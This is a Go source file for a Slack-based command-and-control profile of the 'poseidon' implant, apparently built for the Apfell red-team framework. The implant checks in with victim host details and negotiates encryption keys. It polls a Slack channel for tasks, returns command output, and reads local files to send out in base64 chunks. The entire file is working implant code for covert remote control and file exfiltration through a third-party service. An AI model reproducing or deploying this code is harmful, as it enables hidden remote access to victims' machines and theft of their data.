// +build slack

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"log"
	"math"
	"os"
	"strings"
	"time"

	"github.com/nlopes/slack"
	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var (
	token     = "SLACKLEGACYTOKEN"
	channelid = "SLACKCHANNELID"
)

type C2Slack struct {
	HostHeader     string
	BaseURL        string
	BaseURLs       []string
	Interval       int
	Commands       []string
	ExchangingKeys bool
	ApfellID       string
	UserAgent      string
	ChannelID      string
	ApiToken       string
	Client         *slack.Client
	MessageChannel chan interface{}
	UUID           string
	AesPSK         string
	RsaPrivateKey  *rsa.PrivateKey
}

func newProfile() Profile {
	return &C2Slack{}
}

func (c C2Slack) Header() string {
	return c.HostHeader
}

func (c *C2Slack) SetHeader(newHeader string) {
	c.HostHeader = newHeader
}

func (c C2Slack) URL() string {
	if len(c.BaseURLs) == 0 {
		return c.BaseURL
	} else {
		return c.getRandomBaseURL()
	}
}

func (c *C2Slack) getRandomBaseURL() string {
	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
}

func (c *C2Slack) SetURL(newURL string) {
	c.BaseURL = newURL
}

func (c *C2Slack) SetURLs(newURLs []string) {
	c.BaseURLs = newURLs
}

func (c C2Slack) SleepInterval() int {
	return c.Interval
}

func (c *C2Slack) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c C2Slack) C2Commands() []string {
	return c.Commands
}

func (c *C2Slack) SetC2Commands(commands []string) {
	c.Commands = commands
}

func (c C2Slack) XKeys() bool {
	return c.ExchangingKeys
}

func (c *C2Slack) SetXKeys(xkeys bool) {
	c.ExchangingKeys = xkeys
}

func (c C2Slack) ApfID() string {
	return c.ApfellID
}

func (c *C2Slack) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Slack) UniqueID() string {
	return c.UUID
}

func (c *C2Slack) SetUniqueID(newID string) {
	c.UUID = newID
}

func (c *C2Slack) SetUserAgent(ua string) {
	c.UserAgent = ua
}

func (c C2Slack) GetUserAgent() string {
	return c.UserAgent
}

func (c C2Slack) AesPreSharedKey() string {
	return c.AesPSK
}

func (c *C2Slack) SetAesPreSharedKey(newKey string) {
	c.AesPSK = newKey
}

func (c C2Slack) RsaKey() *rsa.PrivateKey {
	return c.RsaPrivateKey
}

func (c *C2Slack) SetRsaKey(newKey *rsa.PrivateKey) {
	c.RsaPrivateKey = newKey
}

func (c *C2Slack) SetSlackClient(newclient *slack.Client) {
	c.Client = newclient
}

func (c *C2Slack) GetSlackClient() *slack.Client {
	return c.Client
}

func (c *C2Slack) SetApiToken(token string) {
	c.ApiToken = token
}

func (c *C2Slack) GetApiToken() string {
	return c.ApiToken
}

func (c *C2Slack) SetChannelID(id string) {
	c.ChannelID = id
}

func (c *C2Slack) GetChannelID() string {
	return c.ChannelID
}

func (c *C2Slack) GetTasking() interface{} {
	rawTask := c.sendData(TaskMsg, ApfellIDType, c.ApfID(), "", []byte(""))
	task := structs.Task{}
	err := json.Unmarshal(rawTask, &task)

	if err != nil {
		//log.Printf("Error unmarshalling task data: %s", err.Error())
		return task
	}

	return task
}

func (c *C2Slack) PostResponse(task structs.Task, output string) []byte {
	taskResp := structs.TaskResponse{}
	taskResp.Response = base64.StdEncoding.EncodeToString([]byte(output))
	dataToSend, _ := json.Marshal(taskResp)
	return c.sendData(ResponseMsg, TASKIDType, task.ID, "", dataToSend)
}

func (c *C2Slack) SendFile(task structs.Task, params string) {
	fileReq := structs.FileRegisterRequest{}
	fileReq.Task = task.ID
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		return
	}

	fi, err := file.Stat()
	if err != nil {
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	file.Read(raw)

	c.SendFileChunks(task, raw)
}

func (c *C2Slack) SendFileChunks(task structs.Task, fileData []byte) {
	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileRegisterRequest{}
	chunkResponse.Chunks = int(chunks)
	chunkResponse.Task = task.ID

	msg, _ := json.Marshal(chunkResponse)
	resp := c.PostResponse(task, string(msg))
	fileResp := structs.FileRegisterResponse{}

	err := json.Unmarshal(resp, &fileResp)

	if err != nil {
		return
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	time.Sleep(time.Duration(c.Interval) * time.Second)
	for i := uint64(0); i < chunks; i++ {
		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			break
		}

		msg := structs.FileChunk{}
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.ChunkNumber = int(i) + 1
		msg.FileID = fileResp.FileID

		encmsg, _ := json.Marshal(msg)

		resp := c.PostResponse(task, string(encmsg))
		postResp := structs.FileChunkResponse{}
		_ = json.Unmarshal(resp, &postResp)

		if !strings.Contains(postResp.Status, "success") {
			// If the post was not successful, wait and try to send it one more time
			time.Sleep(time.Duration(c.Interval) * time.Second)
			resp = c.PostResponse(task, string(encmsg))
		}

		time.Sleep(time.Duration(c.Interval) * time.Second)
	}

	c.PostResponse(task, "File download complete")
}

func (c *C2Slack) GetFile(fileid string) []byte {
	fileData := c.sendData(FileMsg, FileIDType, fileid, c.ApfID(), []byte(""))

	return fileData
}

func (c *C2Slack) CheckIn(ip string, pid int, user string, host string) interface{} {

	c.SetApiToken(token)
	c.SetChannelID(channelid)

	c.SetSlackClient(slack.New(c.GetApiToken()))

	var resp []byte

	checkin := structs.CheckInStruct{}
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID

	checkinMsg, _ := json.Marshal(checkin)

	if c.ExchangingKeys {
		sID := c.NegotiateKey()
		log.Printf("Session ID: %s ", sID)
		if len(sID) == 0 {
			log.Println("Empty session id. Key exchange failed")
			return structs.CheckinResponse{Status: "failed"}
		}

		resp = c.sendData(EKE, SESSIDType, sID, "", checkinMsg)
	} else if len(c.AesPreSharedKey()) != 0 {
		log.Println("Sending AES PSK checkin")
		resp = c.sendData(AES, UUIDType, c.UUID, "", checkinMsg)
	} else {
		log.Println("Sending unencrypted checkin")
		resp = c.sendData(CheckInMsg, UUIDType, c.UUID, "", checkinMsg)
	}

	log.Printf("Raw response: %s ", string(resp))
	respMsg := structs.CheckinResponse{}
	err := json.Unmarshal(resp, &respMsg)
	if err != nil {
		log.Printf("Error unmarshaling response: %s", err.Error())
		return structs.CheckinResponse{Status: "failed"}
	}

	return respMsg
}

func (c C2Slack) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.SetRsaKey(priv)
	initMessage := structs.EKEInit{}
	// Assign the session ID and the base64 encoded pub key
	initMessage.SessionID = sessionID
	initMessage.Pub = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	unencryptedMsg, err := json.Marshal(initMessage)

	if err != nil {
		log.Printf("Error marshaling data %s", err.Error())
		return ""
	}

	res := c.sendData(EKE, UUIDType, UUID, "", unencryptedMsg)

	// base64 decode the response and then decrypt it
	rawResp, err := base64.StdEncoding.DecodeString(string(res))
	if err != nil {
		log.Printf("Error decoding string %s ", err.Error())
		return ""
	}

	decryptedResponse := crypto.RsaDecryptCipherBytes(rawResp, c.RsaKey())
	sessionKeyResp := structs.SessionKeyResponse{}
	log.Printf("RSA Decrypted Response from Apfell: %s\n", string(decryptedResponse))
	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
	if err != nil {
		log.Printf("Error unmarshaling response %s", err.Error())
		return ""
	}

	// Save the new AES session key
	c.SetAesPreSharedKey(sessionKeyResp.EncSessionKey)
	c.SetXKeys(false)
	return sessionID
}

func (c *C2Slack) sendData(msgType int, idType int, id string, tag string, data []byte) []byte {
	var timestamp string
	m := structs.Message{}
	log.Printf("Raw client message to apfell: %s", string(data))
	if len(c.AesPreSharedKey()) != 0 {
		m.Data = string(EncryptMessage(data, c.AesPreSharedKey()))
	} else {
		m.Data = string(data)
	}

	m.MType = msgType
	m.IDType = idType
	m.ID = id
	m.Tag = tag
	m.Client = true
	log.Printf("Sending message %+v\n", m)
	rawM, err := json.Marshal(m)

	if err != nil {
		log.Printf("Error marshaling message: %s", err.Error())
		return make([]byte, 0)
	}

	if len(rawM) < 4000 {
		// Messages less than
		log.Println("Sending a normal message")
		_, timestamp, _, err = c.Client.SendMessage(c.GetChannelID(), slack.MsgOptionText(string(rawM), true))

		if err != nil {
			log.Printf("Error sending message: %s", err.Error())
			return make([]byte, 0)
		}

	} else if len(rawM) > 4000 && len(rawM) < 8000 {
		log.Println("Sending an attachment")
		attachment := slack.Attachment{
			Color:         "",
			Fallback:      "",
			CallbackID:    "",
			ID:            0,
			AuthorID:      "",
			AuthorName:    "",
			AuthorSubname: "",
			AuthorLink:    "",
			AuthorIcon:    "",
			Title:         "",
			TitleLink:     "",
			Pretext:       "",
			Text:          string(rawM),
			ImageURL:      "",
			ThumbURL:      "",
			Fields:        nil,
			Actions:       nil,
			MarkdownIn:    nil,
			Footer:        "",
			FooterIcon:    "",
			Ts:            "",
		}

		_, timestamp, _, err = c.Client.SendMessage(c.GetChannelID(), slack.MsgOptionAttachments(attachment), slack.MsgOptionText("", true))
		if err != nil {
			log.Printf("Error sending message: %s", err.Error())
			return make([]byte, 0)
		}
	} else {
		log.Println("Uploading a file")
		fname := GenerateSessionID()

		params := slack.FileUploadParameters{
			File:           "newmessage.json",
			Content:        string(rawM),
			Reader:         nil,
			Filetype:       "",
			Filename:       fname,
			Title:          "",
			InitialComment: "",
			Channels:       []string{c.GetChannelID()},
		}

		f, err := c.Client.UploadFile(params)
		if err != nil {
			log.Printf("Error sending message: %s", err.Error())
			return make([]byte, 0)
		}

		timestamp = f.Shares.Public[c.GetChannelID()][0].Ts

	}

	respMsg := structs.Message{}

	for {

		params := &slack.GetConversationRepliesParameters{
			ChannelID: c.GetChannelID(),
			Timestamp: timestamp,
			Inclusive: false,
			Oldest:    timestamp,
		}

		msgs, _, _, err := c.Client.GetConversationReplies(params)

		if len(msgs) > 1 {
			reply := msgs[1]
			log.Printf("Received %d replies\n", len(msgs))

			if len(reply.Text) != 0 && len(reply.Attachments) == 0 && len(reply.Files) == 0 {
				log.Printf("Plain Message text: %s", reply.Text)
				err = json.Unmarshal([]byte(reply.Text), &respMsg)
				if err != nil {
					log.Println("error unmarshaling response ", err.Error())
				}

				break
			} else if len(reply.Attachments) > 0 {
				content := reply.Attachments[0].Text
				log.Printf("Message from attachment: %s", content)
				err = json.Unmarshal([]byte(content), &respMsg)
				if err != nil {
					log.Println("error unmarshaling response ", err.Error())
				}
				break
			} else if len(reply.Files) > 0 {
				var fileContents bytes.Buffer

				err := c.Client.GetFile(reply.Files[0].URLPrivateDownload, &fileContents)
				if err != nil {
					log.Println("error getting file ", err.Error())
				}
				log.Printf("Message from file: %s", string(fileContents.Bytes()))
				err = json.Unmarshal(fileContents.Bytes(), &respMsg)
				if err != nil {
					log.Println("error unmarshaling response ", err.Error())
				}

				break
			}
		}

		time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
	}

	if len(c.AesPreSharedKey()) != 0 && c.ExchangingKeys != true {
		dec := DecryptMessage([]byte(respMsg.Data), c.AesPreSharedKey())
		log.Printf("Decrypted response from apfell: %s", string(dec))
		return dec
	}

	return []byte(respMsg.Data)
}
